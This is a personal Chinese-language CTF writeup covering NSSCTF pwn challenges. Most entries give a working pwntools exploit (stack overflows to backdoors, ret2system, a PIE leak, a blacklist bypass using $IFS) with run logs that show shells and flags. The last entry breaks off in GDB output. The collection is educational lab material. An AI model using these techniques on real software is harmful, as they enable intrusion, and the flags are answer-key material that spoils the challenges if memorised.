# [个人] NSSCTF2025下旬的Writeup

# 2025年下旬

## Pwn

### [SWPUCTF 2021 新生赛]nc签到

#### 解题过程

**查看题目**

```python
import os

art = '''

   ((  "####@@!!$$    ))
       `#####@@!$$`  ))
    ((  '####@!!$:
   ((  ,####@!!$:   ))
       .###@!!$:
       `##@@!$:
        `#@!!$
  !@#    `#@!$:       @#$
   #$     `#@!$:       !@!
            '@!$:
        '`\   "!$: /`'
           '\  '!: /'
             "\ : /"
  -."-/\\\-."//.-"/:`\."-.JrS"."-=_\\
" -."-.\\"-."//.-".`-."_\\-.".-\".-//'''
print(art)
print("My_shell_ProVersion")

blacklist = ['cat','ls',' ','cd','echo','<','${IFS}']

while True:
    command = input()
    for i in blacklist:
        if i in command:
            exit(0)
    os.system(command)
```

**解题操作**

```shell
nc node4.anna.nssctf.cn 28402
tac$IFS/flag
```

```shell
NSSCTF{98d0aa32-55f9-43c3-9a2f-c53a0ce9ffa0}
```

**得到：NSSCTF{98d0aa32-55f9-43c3-9a2f-c53a0ce9ffa0}**



### [SWPUCTF 2021 新生赛]gift_pwn

#### 解题过程

**查看题目**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  vuln(argc, argv, envp);
  return 0;
}

ssize_t vuln()
{
  _BYTE buf[16]; // [rsp+0h] [rbp-10h] BYREF

  return read(0, buf, 0x64uLL);
}
```

**分析**

- `read(0, buf, 0x64uLL)`存在栈溢出

**数据搜集**

```assembly
.text:00000000004005B6                 public gift
.text:00000000004005B6 gift            proc near
.text:00000000004005B6 ; __unwind {
.text:00000000004005B6                 push    rbp
.text:00000000004005B7                 mov     rbp, rsp
.text:00000000004005BA                 mov     edi, offset s   ; "Welcom new to NSS"
.text:00000000004005BF                 call    _puts
.text:00000000004005C4                 mov     edi, offset command ; "/bin/sh"
.text:00000000004005C9                 mov     eax, 0
.text:00000000004005CE                 call    _system
.text:00000000004005D3                 nop
.text:00000000004005D4                 pop     rbp
.text:00000000004005D5                 retn
.text:00000000004005D5 ; } // starts at 4005B6
.text:00000000004005D5 gift            endp
```

**编写最终脚本**

```python
from pwn import *

r = remote("node4.anna.nssctf.cn", 28438)

payload = cyclic(0x10)
payload += p64(0xdeadbeef)
payload += p64(0x4005BA)
r.send(payload)

r.interactive()
```

**运行最终脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[*] Checking for new versions of pwntools
    To disable this functionality, set the contents of C:\Users\probie\.cache\.pwntools-cache-3.13\update to 'never' (old way).
    Or add the following lines to ~/.pwn.conf or ~/.config/pwn.conf (or /etc/pwn.conf system-wide):
        [update]
        interval=never
[*] A newer version of pwntools is available on pypi (4.14.1 --> 4.15.0).
    Update with: $ pip install -U pwntools
[x] Opening connection to node4.anna.nssctf.cn on port 28438
[x] Opening connection to node4.anna.nssctf.cn on port 28438: Trying 1.14.71.254
[+] Opening connection to node4.anna.nssctf.cn on port 28438: Done
[*] Switching to interactive mode
ls
bin
dev
flag
lib
lib32
lib64
pwn5
cat flag
NSSCTF{450abe6f-f013-4cef-b038-a73dc6c89204}
```

**得到：NSSCTF{450abe6f-f013-4cef-b038-a73dc6c89204}**



### [LitCTF 2023]只需要nc一下~

#### 解题过程

```shell
ls /
```

```shell
app
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
```

```shell
cat /flag.txt
```

```
NSSCTF{123456}
```

发现`NSSCTF{123456}`不正确

```shell
env
```

```shell
HOSTNAME=0eeeedb476f047d3
PYTHON_PIP_VERSION=22.3.1
HOME=/root
GPG_KEY=A035C8C19219BA821ECEA86B64E628F8D684696D
PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/d5cb0afaf23b8520f1bbcfed521017b4a95f5c01/public/get-pip.py
PATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
LANG=C.UTF-8
PYTHON_VERSION=3.11.3
PYTHON_SETUPTOOLS_VERSION=65.5.1
PWD=/app
PYTHON_GET_PIP_SHA256=394be00f13fa1b9aaa47e911bdb59a09c3b2986472130f30aa0bfaf7f3980637
FLAG=NSSCTF{c471e435-f0c3-4988-8459-78a893a4bdb0}
```

**得到：NSSCTF{c471e435-f0c3-4988-8459-78a893a4bdb0}**



### [CISCN 2019华北]PWN1

#### 解题过程

**查看题目**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  func();
  return 0;
}

int func()
{
  _BYTE v1[44]; // [rsp+0h] [rbp-30h] BYREF
  float v2; // [rsp+2Ch] [rbp-4h]

  v2 = 0.0;
  puts("Let's guess the number.");
  gets(v1);
  if ( v2 == 11.28125 )
    return system("cat /flag");
  else
    return puts("Its value should be 11.28125");
}
```

**分析**

- `v2`的值为`11.28125`
- 我们可以用`v1`覆盖`v2`的值为`11.28125`
- `长度 = 0x30 - 0x4 = 0x2c`

**编写最终脚本**

```python
import struct

from pwn import *

r = remote("node7.anna.nssctf.cn", 22514)

payload = cyclic(0x2c)
payload += struct.pack("<f", 11.28125)
r.sendlineafter(b"Let's guess the number.", payload)

r.interactive()
```

**解读**

- `<`代表小端序
- `f`代表浮点型

**运行最终脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to node7.anna.nssctf.cn on port 22514
[x] Opening connection to node7.anna.nssctf.cn on port 22514: Trying 175.178.183.208
[+] Opening connection to node7.anna.nssctf.cn on port 22514: Done
[*] Switching to interactive mode

NSSCTF{bf4ddfc2-f108-4050-8200-5d4ae620fcc7}
[*] Got EOF while reading in interactive
```

**得到：NSSCTF{bf4ddfc2-f108-4050-8200-5d4ae620fcc7}**



### [NISACTF 2022]ReorPwn?

#### 解题过程

**查看题目**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  puts("evcexe ot tnaw uoy tahw em lleT:");
  gets((__int64)a);
  fun(a);
  system(a);
  return 0;
}

__int64 __fastcall fun(const char *a1)
{
  __int64 result; // rax
  char v2; // [rsp+17h] [rbp-9h]
  int i; // [rsp+18h] [rbp-8h]
  int v4; // [rsp+1Ch] [rbp-4h]

  v4 = strlen(a1);
  for ( i = 0; ; ++i )
  {
    result = (unsigned int)(v4 / 2);
    if ( i >= (int)result )
      break;
    v2 = a1[i];
    a1[i] = a1[v4 - i - 1];
    a1[v4 - i - 1] = v2;
  }
  return result;
}
```

**分析**

- `fun`函数的逻辑是反转输入
- 我们需要执行system("/bin/sh")就要反转`/bin/sh`为`hs/nib/`

**发送payload**

```shell
nc node4.anna.nssctf.cn 28638
hs/nib/
ls
```

```shell
ls
bin
dev
flag
lib
lib32
lib64
pwn
cat flag
```

```shell
cat flag
```

```shell
NSSCTF{59717bc5-f44d-40c9-ac59-3809f1a5f510}
```

**得到：NSSCTF{59717bc5-f44d-40c9-ac59-3809f1a5f510}**



### [SWPUCTF 2022 新生赛]Does your nc work？

#### 解题过程

```shell
nc node5.anna.nssctf.cn 27136
ls
```

```shell
bin
dev
lib
lib32
lib64
libx32
nss
pwn
```

**分析**

- ls [目录] 可以带很多参数比如
- -a 显示隐藏目录
- -l 显示具体信息，如创建时间，权限等
- -R 循环递归指定目录下的所有目录和文件

```shell
ls / -alR
ls / -R
```

```shell
/nss/ctf:
flag
```

```shell
cat /nss/ctf/flag
```

```shell
NSSCTF{e39255f5-653c-4d61-8f85-3f9a2968af60}
```

**得到：NSSCTF{e39255f5-653c-4d61-8f85-3f9a2968af60}**



### [BJDCTF 2020]babystack

#### 解题过程

**信息搜集**

```shell
file pwn
```

```
pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0f94e35d5a96e7d0fe5c63a525f441e7fa7549b1, not stripped
```

```shell
checksec --file=pwn
```

```shell
pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0f94e35d5a96e7d0fe5c63a525f441e7fa7549b1, not stripped
```

**分析**

- linux64位小端序

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[12]; // [rsp+0h] [rbp-10h] BYREF
  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF

  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  LODWORD(nbytes) = 0;
  puts("**********************************");
  puts("*     Welcome to the BJDCTF!     *");
  puts("* And Welcome to the bin world!  *");
  puts("*  Let's try to pwn the world!   *");
  puts("* Please told me u answer loudly!*");
  puts("[+]Are u ready?");
  puts("[+]Please input the length of your name:");
  __isoc99_scanf("%d", &nbytes);
  puts("[+]What's u name?");
  read(0, buf, (unsigned int)nbytes);
  return 0;
}
```

**分析**

- 存在可控栈溢出

**数据搜集**

```assembly
.text:00000000004006E6                 public backdoor
.text:00000000004006E6 backdoor        proc near
.text:00000000004006E6 ; __unwind {
.text:00000000004006E6                 push    rbp
.text:00000000004006E7                 mov     rbp, rsp
.text:00000000004006EA                 mov     edi, offset command ; "/bin/sh"
.text:00000000004006EF                 call    _system
.text:00000000004006F4                 mov     eax, 1
.text:00000000004006F9                 pop     rbp
.text:00000000004006FA                 retn
.text:00000000004006FA ; } // starts at 4006E6
.text:00000000004006FA backdoor        endp
```

**分析**

- 存在后门函数

**编写最终脚本**

```python
from pwn import *

r = remote("node4.anna.nssctf.cn", 28936)

payload = str(0x100).encode()
r.sendlineafter(b"name:\n", payload)

backdoor_addr = 0x4006EA

payload = cyclic(0x10)
payload += p64(0xdeadbeef)
payload += p64(backdoor_addr)
r.sendafter(b"name?\n", payload)

r.interactive()
```

**运行最终脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to node4.anna.nssctf.cn on port 28936
[x] Opening connection to node4.anna.nssctf.cn on port 28936: Trying 1.14.71.254
[+] Opening connection to node4.anna.nssctf.cn on port 28936: Done
[*] Switching to interactive mode
ls
bin
boot
dev
etc
flag
flag.txt
home
lib
lib32
lib64
media
mnt
opt
proc
pwn
root
run
sbin
srv
sys
tmp
usr
var
cat flag
NSSCTF{ab9d4b7f-24a2-4dec-833d-9060ddbef501}
```

**得到：NSSCTF{ab9d4b7f-24a2-4dec-833d-9060ddbef501}**



### [BJDCTF 2020]babystack2.0

#### 解题过程

**信息搜集**

```shell
file pwn
```

```shell
pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=98383c4b37ec43aae16b46971bd5ead3f03ce0a6, not stripped
```

```shell
checksec --file=pwn
```

```shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   75 Symbols        No    0               1               pwn
```

**分析**

- linux64位小端序

**查看题目**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[12]; // [rsp+0h] [rbp-10h] BYREF
  size_t nbytes; // [rsp+Ch] [rbp-4h] BYREF

  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  LODWORD(nbytes) = 0;
  puts("**********************************");
  puts("*     Welcome to the BJDCTF!     *");
  puts("* And Welcome to the bin world!  *");
  puts("*  Let's try to pwn the world!   *");
  puts("* Please told me u answer loudly!*");
  puts("[+]Are u ready?");
  puts("[+]Please input the length of your name:");
  __isoc99_scanf("%d", &nbytes);
  if ( (int)nbytes > 10 )
  {
    puts("Oops,u name is too long!");
    exit(-1);
  }
  puts("[+]What's u name?");
  read(0, buf, (unsigned int)nbytes);
  return 0;
}
```

**分析**

- 这题`[BJDCTF 2020]babystack`差不多，都有可控栈溢出
- 不同的是多了`(int)nbytes > 10`的判断
- 但是`read`存在`unsigned int`的滥用`(unsigned int)nbytes`
- 我们可以用负数，如`-1`绕过长度限制

**数据搜集**

```ass
.text:0000000000400726                 public backdoor
.text:0000000000400726 backdoor        proc near
.text:0000000000400726 ; __unwind {
.text:0000000000400726                 push    rbp
.text:0000000000400727                 mov     rbp, rsp
.text:000000000040072A                 mov     edi, offset command ; "/bin/sh"
.text:000000000040072F                 call    _system
.text:0000000000400734                 mov     eax, 1
.text:0000000000400739                 pop     rbp
.text:000000000040073A                 retn
.text:000000000040073A ; } // starts at 400726
.text:000000000040073A backdoor        endp
```

**分析**

- 存在后门函数
- 地址取`0x40072A`就可以了

**编写最终脚本**

```python
from pwn import *

r = remote("node4.anna.nssctf.cn", 28049)

payload = str(-1).encode()
r.sendlineafter(b"name:\n", payload)

backdoor_addr = 0x40072A

payload = cyclic(0x10)
payload += p64(0xdeadbeef)
payload += p64(backdoor_addr)
r.sendafter(b"name?\n", payload)

r.interactive()
```

**运行最终脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to node4.anna.nssctf.cn on port 28049
[x] Opening connection to node4.anna.nssctf.cn on port 28049: Trying 1.14.71.254
[+] Opening connection to node4.anna.nssctf.cn on port 28049: Done
[*] Switching to interactive mode
ls
bin
boot
dev
etc
flag
flag.txt
home
lib
lib32
lib64
media
mnt
opt
proc
pwn
root
run
sbin
srv
sys
tmp
usr
var
cat flag
NSSCTF{a8c74610-ddb2-4f7e-aef0-2b0f61d092aa}
```

**得到：NSSCTF{a8c74610-ddb2-4f7e-aef0-2b0f61d092aa}**



### [HNCTF 2022 Week1]easync

#### 解题过程

```shell
nc node5.anna.nssctf.cn 28376
ls
```

```shell
bin
dev
easync
flag
gift
lib
lib32
lib64
libexec
libx32
nothing
```

```shell
cat flag
```

```shell
nssctf{fake_flag}
```

**分析**

- flag是fake(假的)
- 我们继续找一下其他flag
- 我们看到`gift`和`nothing`

```shell
ls gift nothing -lR
```

```shell
gift:
total 8
-rwxr----- 1 0 1000   14 Sep 27  2022 2galf
drwxr----- 1 0 1000 4096 Sep 27  2022 flag2

gift/flag2:
total 0

nothing:
total 4
-rwxr----- 1 0 1000 11 Sep 27  2022 flag1
```

```shell
cat nothing/flag1 gift/2galf
```

```
nssctf{Nc_
@nd_g3t5h31L}
```

**得到：nssctf{Nc_@nd_g3t5h31L}**



### [HGAME 2023 week1]test_nc

#### 解题过程

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  system("/bin/sh");
  return 0;
}
```

**分析**

- 这题可以直接ne(netcat)连接，然后`ls`，然后`cat flag`获取到`flag`
- 但是既然是`test`，那我们尝试写一个脚本来解这道题

**编写最终脚本**

```shell
from pwn import *

r = remote("node5.anna.nssctf.cn", 20004)

target_dir = "/"

payload = f"ls {target_dir}".encode()
r.sendline(payload)

ls = r.recv(1024)
if ls.__contains__(b"flag"):
    payload = f"cat {target_dir}/flag".encode()
    r.sendline(payload)
    print(r.recvline().decode().strip())
    r.close()
else:
    print(f"目录{target_dir}找不到flag")
    r.close()

r.interactive()
```

**运行最终脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to node5.anna.nssctf.cn on port 20004
[x] Opening connection to node5.anna.nssctf.cn on port 20004: Trying 118.195.175.220
[+] Opening connection to node5.anna.nssctf.cn on port 20004: Done
NSSCTF{ea14531f-51ad-49cb-8838-a4007fea98da}
[*] Closed connection to node5.anna.nssctf.cn port 20004
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
```

**得到：NSSCTF{ea14531f-51ad-49cb-8838-a4007fea98da}**



### [NISACTF 2022]ezstack

#### 解题过程

**信息搜集**

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

**分析**

- linux32位小端序

**查看源码**

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  shell();
  return 0;
}

ssize_t shell()
{
  _BYTE buf[72]; // [esp+0h] [ebp-48h] BYREF

  system("echo Welcome to NISACTF");
  return read(0, buf, 0x60u);
}
```

**分析**

- `read(0, buf, 0x60u)`存在栈溢出，其中`0x48 == 72`所以我们覆盖`0x48`或`72`个长度都可以

**编写最终脚本**

```python
from pwn import *

r = remote("node5.anna.nssctf.cn", 21013)
elf = ELF("./pwn")

bin_sh_addr = next(elf.search("/bin/sh".encode()))
system_addr = elf.sym["system"]

payload = cyclic(0x48)
payload += p32(0xdeadbeef)
payload += p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)
r.sendafter("Welcome to NISACTF".encode(), payload)

r.interactive()
r.close()
```

**运行最终脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to node5.anna.nssctf.cn on port 21013
[x] Opening connection to node5.anna.nssctf.cn on port 21013: Trying 118.195.175.220
[+] Opening connection to node5.anna.nssctf.cn on port 21013: Done
[*] 'D:\\Work\\test\\testPython\\src\\com\\probie\\test01\\pwn'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
[*] Switching to interactive mode

ls
bin
dev
flag
lib
lib32
lib64
pwn
cat flag
NSSCTF{b610d0eb-0b79-482c-8c33-6d2e4eb2386d}
```

**得到：NSSCTF{b610d0eb-0b79-482c-8c33-6d2e4eb2386d}**



### [watevrCTF 2019]Voting Machine 1

#### 解题过程

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[2]; // [rsp+Eh] [rbp-2h] BYREF

  signal(14, (__sighandler_t)sig);
  alarm(0x28u);
  puts("Hello and welcome to \x1B[3mour\x1B[23m voting application!");
  puts("Today's vote will be regarding the administration of");
  puts("watevr CTF.");
  puts("the voting range is 0 to 10. 0 being the worst possible and 10 being the best possible.");
  puts("Thanks!");
  printf("Vote: ");
  fflush(_bss_start);
  gets(v4);
  puts("Thanks for voting!");
  return 0;
}
```

**分析**

- 这里`gets(v4)`存在栈溢出漏洞
- 缓冲区`_BYTE v4[2]; // [rsp+Eh] [rbp-2h] BYREF`中`0x2h == 4 > 2`所以我们填充字符的长度选择`4`，即`0x2`

**数据搜集**

```c
void __noreturn super_secret_function()
{
  FILE *stream; // [rsp+0h] [rbp-10h]
  char i; // [rsp+Fh] [rbp-1h]

  stream = fopen("/home/ctf/flag.txt", "r");
  if ( !stream )
  {
    puts("Cannot open flag.txt");
    exit(1);
  }
  for ( i = fgetc(stream); i != -1; i = fgetc(stream) )
    putchar(i);
  fclose(stream);
  exit(0);
}
```

```assembly
.text:0000000000400807                 public super_secret_function
.text:0000000000400807 super_secret_function proc near
.text:0000000000400807
.text:0000000000400807 stream          = qword ptr -10h
.text:0000000000400807 var_1           = byte ptr -1
.text:0000000000400807
.text:0000000000400807 ; __unwind {
.text:0000000000400807                 push    rbp
.text:0000000000400808                 mov     rbp, rsp
.text:000000000040080B                 sub     rsp, 10h
.text:000000000040080F                 lea     rsi, modes      ; "r"
.text:0000000000400816                 lea     rdi, filename   ; "/home/ctf/flag.txt"
.text:000000000040081D                 call    _fopen
.text:0000000000400822                 mov     [rbp+stream], rax
.text:0000000000400826                 cmp     [rbp+stream], 0
.text:000000000040082B                 jnz     short loc_400843
.text:000000000040082D                 lea     rdi, s          ; "Cannot open flag.txt"
.text:0000000000400834                 call    _puts
.text:0000000000400839                 mov     edi, 1          ; status
.text:000000000040083E                 call    _exit
```

**编写最终脚本**

```python
from pwn import *

r = remote("node5.anna.nssctf.cn", 23290)

backdoor_addr = 0x400807

payload = cyclic(0x2)
payload += p64(0xdeadbeef)
payload += p64(backdoor_addr)
r.sendlineafter("Vote: ".encode(), payload)

r.interactive()
r.close()
```

**运行最终脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to node5.anna.nssctf.cn on port 23290
[x] Opening connection to node5.anna.nssctf.cn on port 23290: Trying 118.195.175.220
[+] Opening connection to node5.anna.nssctf.cn on port 23290: Done
[*] Switching to interactive mode
Thanks for voting!
NSSCTF{bd09131d-bd77-4df4-9280-4ab93ee3aa0e}
[*] Got EOF while reading in interactive
```

**得到：NSSCTF{bd09131d-bd77-4df4-9280-4ab93ee3aa0e}**



### [HNCTF 2022 Week1]easyoverflow

#### 解题过程

**查看题目**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[44]; // [rsp+0h] [rbp-30h] BYREF
  int v5; // [rsp+2Ch] [rbp-4h]

  setbuf(stdin, 0LL);
  setbuf(stdout, 0LL);
  setbuf(stderr, 0LL);
  puts("Input something");
  v5 = 0;
  gets(v4);
  if ( v5 )
  {
    puts("You win.");
    system("cat flag");
  }
  return 0;
}
```

**分析**

- `0x30 == 48`

**编写最终脚本**

```python
from pwn import *

r = remote("node5.anna.nssctf.cn", 26715)

payload = cyclic(0x30)
payload += p64(1)
r.sendlineafter("Input something\n".encode(), payload)

r.interactive()
r.close()
```

**运行最终脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to node5.anna.nssctf.cn on port 26715
[x] Opening connection to node5.anna.nssctf.cn on port 26715: Trying 118.195.175.220
[+] Opening connection to node5.anna.nssctf.cn on port 26715: Done
[*] Switching to interactive mode
You win.
nssctf{0h_You_OverFl0w_the_pr0gr@mm}
[*] Got EOF while reading in interactive
```

**得到：nssctf{0h_You_OverFl0w_the_pr0gr@mm}**



### [NISACTF 2022]ezpie

#### 解题过程

**信息搜集**

```shell
file pwn
```

```shell
pwn: ELF 32-bit LSB pie executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=69a8104098e391dfe720392dcfed1648de8e5a52, not stripped
```

```shell
checksec --file=pwn
```

```shell
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   79 Symbols        No    0      2pwn
```

**分析**

- linux32位小端序
- PIE

**查看源码**

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setbuf(stdin, 0);
  setbuf(stdout, 0);
  puts("OHHH!,give you a gift!");
  printf("%p\n", main);
  puts("Input:");
  vuln();
  return 0;
}
```

```c
ssize_t vuln()
{
  _BYTE buf[40]; // [esp+0h] [ebp-28h] BYREF

  return read(0, buf, 0x50u);
}
```

**分析**

- `printf("%p\n", main)`这里会泄露`main`函数的真实地址
- 我们只需要用`main真实 - mian偏移 = elf基地址`，然后`后门真实 = elf基地址 + 后门偏移`就可以得到后门函数的真实地址
- `28h == 0x28 == 40`
- `read(0, buf, 0x50u)`这里存在栈溢出

**数据搜集**

```assembly
.text:0000080F                 public shell
.text:0000080F shell           proc near
.text:0000080F ; __unwind {
.text:0000080F                 push    ebp
.text:00000810                 mov     ebp, esp
.text:00000812                 sub     esp, 8
.text:00000815                 sub     esp, 0Ch
.text:00000818                 push    offset command  ; "/bin/sh"
.text:0000081D                 call    system
.text:00000822                 add     esp, 10h
.text:00000825                 nop
.text:00000826                 leave
.text:00000827                 retn
.text:00000827 ; } // starts at 80F
.text:00000827 shell           endp
```

**编写最终脚本**

```python
from pwn import *

r = remote("node5.anna.nssctf.cn", 25394)
elf = ELF("./pwn")

r.recvuntil("OHHH!,give you a gift!\n".encode())
main_addr = int(r.recvuntil("\n".encode()).decode().strip(), 16)
main_offset = elf.sym["main"]
elf_base_addr = main_addr - main_offset

backdoor_offset = 0x80F
backdoor_addr = elf_base_addr + backdoor_offset

payload = cyclic(0x28)
payload += p32(0xdeadbeef)
payload += p32(backdoor_addr)
r.sendafter("Input:\n".encode(), payload)

r.interactive()
r.close()
```

**运行最终脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to node5.anna.nssctf.cn on port 25394
[x] Opening connection to node5.anna.nssctf.cn on port 25394: Trying 118.195.175.220
[+] Opening connection to node5.anna.nssctf.cn on port 25394: Done
[*] 'D:\\Work\\test\\testPython\\src\\com\\probie\\test01\\pwn'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    Stripped:   No
[*] Switching to interactive mode
ls
bin
dev
flag
lib
lib32
lib64
pwn
cat flag
NSSCTF{4cd69652-d3d1-4d75-8866-561fecbd0124}
```

**得到：NSSCTF{4cd69652-d3d1-4d75-8866-561fecbd0124}**



### [NSSCTF 2022 Spring Recruit]R3m4ke?

#### 解题过程

**查看源码**

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE v4[32]; // [rsp+0h] [rbp-20h] BYREF

  init(argc, argv, envp);
  NSS();
  return gets(v4);
}
```

```c
int NSS()
{
  puts(
    "---    ---    ---------     ---------\n"
    "| | \\  | |   / /----|__|   / /----|__|\n"
    "| |\\ \\ | |   | |_______    | |_______\n"
    "| | \\ \\| |   \\ ______  \\   \\ ______  \\\n"
    "| |  \\ \\ |    _______| |    _______| |\n"
    "| |   \\__|   |_________/   |_________/\n"
    "[+] Welcome to NSS , this is a very simple PWN question for getting started>");
  return fflush(stdout);
}
```

**分析**

- `20h == 0x20 == 32`
- `gets(v4)`存在栈溢出

**脚本最终脚本**

```python
from pwn import *

r = remote("node4.anna.nssctf.cn", 28908)

backdoor_add = 0x40072C

payload = cyclic(0x20)
payload += p64(0xdeadbeef)
payload += p64(backdoor_add)
r.sendlineafter(">\n".encode(), payload)

r.interactive()
r.close()
```

**运行最终脚本**

```shell
D:\Environment\python\python-3.13.0-amd64\python.exe D:\Work\test\testPython\src\com\probie\test01\Main.py 
[x] Opening connection to node4.anna.nssctf.cn on port 28908
[x] Opening connection to node4.anna.nssctf.cn on port 28908: Trying 1.14.71.254
[+] Opening connection to node4.anna.nssctf.cn on port 28908: Done
[*] Switching to interactive mode
ls
bin
dev
flag
lib
lib32
lib64
pwn
cat flag
NSSCTF{842368cb-7a28-4720-a53b-c35ee8e4ed26}
```

**得到：NSSCTF{842368cb-7a28-4720-a53b-c35ee8e4ed26}**



### [MoeCTF 2022]babyfmt

#### 解题过程

**信息搜集**

```shell
checksec pwn
```

```shell
[*] '/home/kali/Desktop/ctf/pwn'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```

**查看源码**

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char *s; // [esp+18h] [ebp-110h]
  char buf[256]; // [esp+1Ch] [ebp-10Ch] BYREF
  unsigned int v5; // [esp+11Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stderr, 0, 2, 0);
  s = (char *)malloc(0x10u);
  sprintf(s, "%p", backdoor);
  printf("gift: %p\n", s);
  while ( 1 )
  {
    memset(buf, 0, sizeof(buf));
    read(0, buf, 0xFFu);
    printf(buf);
  }
}
```

**分析**

- 输出的这个`backdoor_addr`不可直接用
- 但可以帮助我们定位到`backdoor_addr`的偏移量

**数据搜集**

```assembly
.text:0804865E loc_804865E:                            ; CODE XREF: main+EE↓j
.text:0804865E                 sub     esp, 4
.text:08048661                 push    100h            ; n
.text:08048666                 push    0               ; c
.text:08048668                 lea     eax, [ebp+buf]
.text:0804866E                 push    eax             ; s
.text:0804866F                 call    _memset
.text:08048674                 add     esp, 10h
.text:08048677                 sub     esp, 4
.text:0804867A                 push    0FFh            ; nbytes
.text:0804867F                 lea     eax, [ebp+buf]
.text:08048685                 push    eax             ; buf
.text:08048686                 push    0               ; fd
.text:08048688                 call    _read
.text:0804868D                 add     esp, 10h
.text:08048690                 sub     esp, 0Ch
.text:08048693                 lea     eax, [ebp+buf]
.text:08048699                 push    eax             ; format
.text:0804869A                 call    _printf
.text:0804869F                 add     esp, 10h
.text:080486A2                 jmp     short loc_804865E
.text:080486A2 ; } // starts at 80485B4
.text:080486A2 main            endp
```

**分析**

- `.text:0804869A                 call    _printf`是循环里的`printf`我们在这里下断点

**GDB调试**

```shell
gdb pwn
b *0x804869A
r
```

```shell
gift: 0x804b1a0
```

```shell
deadbeef
x/50xw $esp
```

```shell
0xffffcd90:     0xffffcdbc      0xffffcdbc      0x000000ff      0x00000000
0xffffcda0:     0xf63d4e2e      0xf7fd0b5e      0x00000001      0xffffcf94
0xffffcdb0:     0xf7d789dc      0x000007d0      0x0804b1a0      0x64616564
0xffffcdc0:     0x66656562      0x0000000a      0x00000000      0x00000000
0xffffcdd0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcde0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffcdf0:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffce00:     0x00000000      0x00000000      0x00000000      0x00000000
